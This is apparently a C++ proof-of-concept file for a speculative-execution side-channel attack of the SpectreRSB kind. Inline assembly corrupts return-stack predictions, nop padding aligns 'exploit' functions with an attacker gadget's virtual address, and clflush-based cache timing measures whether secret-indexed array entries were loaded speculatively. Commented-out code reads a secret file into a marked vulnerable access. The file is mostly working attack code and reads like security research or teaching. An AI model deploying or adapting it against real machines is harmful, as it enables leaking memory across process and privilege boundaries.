#include "util.hpp"
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sched.h>
#define secret 1232
#define secret2 13427
#define nonsecret 21142

#define retAsm(i) "call get_rip" #i ";"  "get_rip" #i ":"  "pop %0;" "add $7,%0;" "push %0;" "ret;"

using namespace std;

char array[256*256];
int total = 0, total2 = 0;
int lbl = 0;

volatile int foo(){
	return 0;
}

inline void timeAndFlush(ADDR_PTR addr) {
	printAccessTime(addr);
	// clflush((void *)addr);
}

volatile void spacer2() {
	asm(
		".rept 915;"
		"nop;"
		".endr;"
	);
}

// void deepCallStack(int depth) {
// 	if (depth == 0) {
// 		sched_yield();
// 		sched_yield();
// 		sched_yield();
// 		return;
// 	} else {
// 		deepCallStack(depth-1);
// 	}
// }

int nextLbl() {
	return lbl++;
}

void trickMe() {
	ADDR_PTR address, tmp;

	for (int i = 0; i < 10000; i++) {
		// deepCallStack(16);
		sched_yield();
		asm(
			retAsm(1)
			retAsm(2)
			retAsm(3)
			retAsm(4)
			retAsm(5)
			retAsm(6)
			retAsm(7)
			retAsm(8)
			retAsm(9)
			retAsm(10)
			retAsm(11)
			retAsm(12)
			retAsm(13)
			retAsm(14)
			retAsm(15)
			retAsm(16)
			: "=r" (tmp)
			: "r" (address)
		);
	
		// timeAndFlush((ADDR_PTR)&array[secret]);
		total += measure_one_block_access_time((ADDR_PTR)&array[secret]);
		total2 += measure_one_block_access_time((ADDR_PTR)&array[secret2]);
		clflush((void *)&array[secret]);
		clflush((void *)&array[secret2]);
	}
}

volatile void spacer() {
	asm(
		// ".rept 1000;"
		// ".rept 936;"
		".rept 4880;"
		"nop;"
		".endr;"
	);
}

void exploit1() { // this should be at the same VA as attacker:gadget()
	volatile int temp = array[secret];
}

void exploit2() { // this should be at the same VA as attacker:gadget()
	volatile int temp = array[secret2];
}

int main(){
	clflush(&array[secret]);
	clflush(&array[nonsecret]);

	trickMe();

	printf("avg time for secret1 is %f\n", total/10000.0);
	printf("avg time for secret2 is %f\n", total2/10000.0);
	// printf("diff avg time is %f\n", total2/1000.0 - total/1000.0);

	// for(int i = 0; i < 10000; i++) {
	// 	printf("%u\n", times[i]);
	// }

	// string buffer;
	// char temp;
	// volatile int i = 0;

	// ifstream secretFile("secret");
	// if(secretFile.is_open()){
	// 	getline(secretFile, buffer);
	// 	secretFile.close();
	// }

	// string secret = buffer;
	// temp &= array[secret[i]*256]; // vulneralbility

	// while(true){
	// 	foo();
	// 	measureAccessTime();
	// }

	return 0;
}